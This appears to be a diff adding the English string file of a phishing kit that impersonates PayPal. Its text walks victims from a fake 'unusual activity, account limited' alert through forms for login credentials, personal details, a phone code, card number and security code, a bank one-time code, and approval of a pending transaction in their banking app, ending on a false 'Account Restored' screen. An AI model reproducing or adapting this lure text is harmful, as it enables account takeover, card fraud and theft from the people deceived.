@@ -1,0 +1,117 @@
+{
+    "COMMON": {
+        "NEXT": "[UK] Next",
+        "CONTINUE": "[UK] Continue",
+        "SUBMIT": "[UK] Submit",
+        "CONFIRM": "[UK] Confirm",
+        "VERIFY": "[UK] Verify",
+        "CLOSE": "[UK] Close",
+        "LOADING": "[UK] Loading...",
+        "SECURE_CONNECTION": "[UK] Secure Connection",
+        "COPYRIGHT": "[UK] © 1999-2026 PayPal Inc. All rights reserved.",
+        "PRIVACY": "[UK] Privacy",
+        "LEGAL": "[UK] Legal",
+        "CONTACT": "[UK] Contact",
+        "WORLDWIDE": "[UK] Worldwide"
+    },
+    "SECURITY": {
+        "CHECKING": "[UK] Checking your security...",
+        "VERIFYING": "[UK] Verifying security...",
+        "CONNECTING": "[UK] Connecting..."
+    },
+    "LOGIN": {
+        "TITLE": "[UK] Log in to your PayPal account",
+        "EMAIL_PLACEHOLDER": "[UK] Email or mobile number",
+        "PASSWORD_PLACEHOLDER": "[UK] Password",
+        "FORGOT": "[UK] Forgot password?",
+        "OR": "[UK] or",
+        "SIGN_UP": "[UK] Sign Up",
+        "LOG_IN": "[UK] Log In",
+        "ERROR_CREDENTIALS": "[UK] Check your entries and try again."
+    },
+    "LIMITED": {
+        "TITLE": "[UK] We need to confirm it's you",
+        "DESCRIPTION": "[UK] We noticed a login from a device we don't recognize. To keep your account secure, we just need to verify your identity.",
+        "BUTTON": "[UK] Confirm Identity",
+        "WHY_LINK": "[UK] Why do I need to do this?",
+        "DIALOG_TITLE": "[UK] Why is my account limited?",
+        "ALERT_TITLE": "[UK] Unusual Activity Detected",
+        "ALERT_DESC": "[UK] We noticed a login attempt from a device or location we don't recognize.",
+        "WHATS_LIMITED": "[UK] What's Limited",
+        "LIMIT_1": "[UK] Sending payments",
+        "LIMIT_2": "[UK] Withdrawing funds",
+        "LIMIT_3": "[UK] Removing payment methods",
+        "HOW_TO_RESOLVE": "[UK] How to Resolve",
+        "RESOLVE_DESC": "[UK] This is a temporary security measure. Once you confirm your identity, full account access will be restored immediately.",
+        "SECURE_ACCOUNT": "[UK] Secure Account"
+    },
+    "PERSONAL": {
+        "TITLE": "[UK] Verify your information",
+        "SUBTITLE": "[UK] Please confirm your personal details to help us secure your account.",
+        "ERROR_TITLE": "[UK] Please check your details",
+        "ERROR_DESC": "[UK] Make sure your information matches your legal ID.",
+        "COUNTRY": "[UK] Country of residence",
+        "FIRST_NAME": "[UK] Legal first name",
+        "LAST_NAME": "[UK] Legal last name",
+        "DOB": "[UK] Date of birth",
+        "PHONE": "[UK] Mobile number",
+        "ADDRESS": "[UK] Street address",
+        "CITY": "[UK] City",
+        "ZIP": "[UK] Zip code",
+        "MUST_BE_18": "[UK] Must be 18+"
+    },
+    "PHONE": {
+        "TITLE_INPUT": "[UK] Let's confirm your number",
+        "DESC_INPUT": "[UK] We'll send a code to your mobile to ensure your account is secure.",
+        "TITLE_CODE": "[UK] Enter your code",
+        "DESC_CODE": "[UK] We sent a security code to your mobile device.",
+        "ERROR_TITLE": "[UK] That didn't work",
+        "DISCLAIMER": "[UK] By continuing, you confirm that you are authorized to use this phone number. Standard message and data rates may apply.",
+        "SEND_CODE": "[UK] Send Code",
+        "CHANGE": "[UK] Change",
+        "RESEND": "[UK] Get a new code",
+        "RESEND_WAIT": "[UK] Resend code in {{seconds}}s",
+        "CODE_SENT": "[UK] Code sent!"
+    },
+    "CARD": {
+        "TITLE": "[UK] Link a card",
+        "SUBTITLE": "[UK] Link a card to confirm your identity and lift account limitations.",
+        "ERROR_TITLE": "[UK] Check your card details",
+        "Card Number": "[UK] Card number",
+        "Expiration Date": "[UK] Expiration Date",
+        "Security Code": "[UK] Security Code",
+        "Billing Address": "[UK] Billing Address"
+    },
+    "CARD_OTP": {
+        "BADGE": "[UK] Bank Verification",
+        "TITLE": "[UK] Confirm with your bank",
+        "DESC": "[UK] We've sent a code to the mobile number registered with your card ending in •••• {{last4}}.",
+        "INVALID_TITLE": "[UK] Invalid Code",
+        "INVALID_DESC": "[UK] Please check the code and try again.",
+        "INPUT_LABEL": "[UK] Enter Bank Code",
+        "NO_CODE": "[UK] Didn't receive a code?",
+        "RESEND": "[UK] Resend Code",
+        "RESEND_WAIT": "[UK] Resend available in {{seconds}}s"
+    },
+    "BANK_APP": {
+        "TITLE": "[UK] Confirm it's you",
+        "DESC": "[UK] Please open your banking app on your mobile device and approve the pending transaction to verify your identity.",
+        "WHY_TITLE": "[UK] Why is this needed?",
+        "WHY_DESC": "[UK] Your bank requires strong authentication for this request. Once approved, return here to continue.",
+        "BUTTON": "[UK] I have approved it",
+        "SECURE_VERIFICATION": "[UK] Secure Verification"
+    },
+    "SUCCESS": {
+        "TITLE": "[UK] Account Restored",
+        "BADGE_TITLE": "[UK] Limitation Lifted",
+        "BADGE_DESC": "[UK] Your account access has been fully restored. You can now send, withdraw, and manage your funds securely.",
+        "EMAIL_SENT": "[UK] A confirmation email has been sent to {{email}}.",
+        "BUTTON": "[UK] Return to Dashboard"
+    },
+    "MODAL_LANG": {
+        "TITLE": "[UK] Choose your language",
+        "DESC": "[UK] We detected you are in {{country}}, but your device is set to {{deviceLang}}.",
+        "USE_DEVICE": "[UK] Use {{deviceLang}}",
+        "USE_IP": "[UK] Use {{ipLang}}"
+    }
+}
